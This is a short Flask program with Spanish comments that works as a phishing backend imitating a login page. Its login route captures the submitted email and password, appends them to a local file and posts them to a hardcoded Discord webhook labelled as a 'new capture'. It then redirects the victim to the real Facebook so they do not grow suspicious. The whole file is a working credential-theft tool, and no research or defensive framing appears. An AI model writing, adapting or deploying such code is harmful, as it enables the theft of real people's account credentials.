from flask import Flask, render_template, request, redirect
import requests # Esta librería envía los datos a internet

app = Flask(__name__)

# AQUÍ PEGAS EL LINK QUE COPIASTE DE DISCORD
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1503510498044280932/j_Y0xMLm20MfK65pkgMi-9tjeLaib0JowM2fUpn5U4ziPZdC9Tl5HbLmfLVNbLrjxzTt"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    # Guardar en el archivo local (el capturado.txt que ya tenías)
    with open("capturado.txt", "a") as f:
        f.write(f"Email: {email} | Pass: {password}\n")

    # ENVIAR A DISCORD (Base Virtual)
    datos_para_discord = {
        "content": f"🎯 **NUEVA CAPTURA**\n**Usuario:** `{email}`\n**Clave:** `{password}`"
    }
    
    try:
        requests.post(WEBHOOK_URL, json=datos_para_discord)
    except:
        print("Error enviando a la base virtual")

    # Redirigir al Facebook real para no levantar sospechas
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(debug=True, port=5000)